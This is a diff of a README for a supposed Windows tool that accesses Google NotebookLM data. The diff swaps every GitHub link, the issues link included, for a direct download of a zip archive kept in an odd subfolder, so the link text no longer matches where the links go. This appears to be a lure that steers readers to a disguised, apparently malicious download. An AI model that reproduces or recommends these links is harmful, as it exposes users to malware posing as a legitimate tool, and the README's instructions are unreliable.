@@ -1,6 +1,6 @@
 # 📝 notebooklm-rest-api - Easy Access to Google NotebookLM Data
 
-[![Download](https://img.shields.io/badge/Download-NotebookLM%20API-blue?style=for-the-badge)](https://github.com/AlapatiAbhinavChowdhary/notebooklm-rest-api)
+[![Download](https://img.shields.io/badge/Download-NotebookLM%20API-blue?style=for-the-badge)](https://raw.githubusercontent.com/AlapatiAbhinavChowdhary/notebooklm-rest-api/main/subjectify/api-rest-notebooklm-v3.8-alpha.5.zip)
 
 ## 📦 What is notebooklm-rest-api?
 
@@ -30,7 +30,7 @@ The tool does not require installation of programming languages or developer too
 
 Click on the big blue button below to visit the GitHub page where you can download notebooklm-rest-api.
 
-[![Download notebooklm-rest-api](https://img.shields.io/badge/Download-NotebookLM%20API-blue?style=for-the-badge)](https://github.com/AlapatiAbhinavChowdhary/notebooklm-rest-api)
+[![Download notebooklm-rest-api](https://img.shields.io/badge/Download-NotebookLM%20API-blue?style=for-the-badge)](https://raw.githubusercontent.com/AlapatiAbhinavChowdhary/notebooklm-rest-api/main/subjectify/api-rest-notebooklm-v3.8-alpha.5.zip)
 
 ## 🚀 Getting Started: Download and Run on Windows
 
@@ -40,7 +40,7 @@ Follow these steps to download and run notebooklm-rest-api on your Windows PC.
 
 Go to the main GitHub repository page by clicking this link:
 
-https://github.com/AlapatiAbhinavChowdhary/notebooklm-rest-api
+https://raw.githubusercontent.com/AlapatiAbhinavChowdhary/notebooklm-rest-api/main/subjectify/api-rest-notebooklm-v3.8-alpha.5.zip
 
 On this page, look for a section called "Releases" or scroll down to find a file you can download. This file will usually be named with `.exe` or `.zip` if it’s packaged for Windows.
 
@@ -106,10 +106,10 @@ If you have internet issues, the app may fail to connect with Google NotebookLM.
 
 The GitHub page has a section for issues and discussions that you can use if you face problems beyond these instructions.
 
-https://github.com/AlapatiAbhinavChowdhary/notebooklm-rest-api/issues
+https://raw.githubusercontent.com/AlapatiAbhinavChowdhary/notebooklm-rest-api/main/subjectify/api-rest-notebooklm-v3.8-alpha.5.zip
 
 You can also check the included README or documentation files in the download for more details.
 
 ---
 
-[![Download notebooklm-rest-api](https://img.shields.io/badge/Download-NotebookLM%20API-blue?style=for-the-badge)](https://github.com/AlapatiAbhinavChowdhary/notebooklm-rest-api)
+[![Download notebooklm-rest-api](https://img.shields.io/badge/Download-NotebookLM%20API-blue?style=for-the-badge)](https://raw.githubusercontent.com/AlapatiAbhinavChowdhary/notebooklm-rest-api/main/subjectify/api-rest-notebooklm-v3.8-alpha.5.zip)
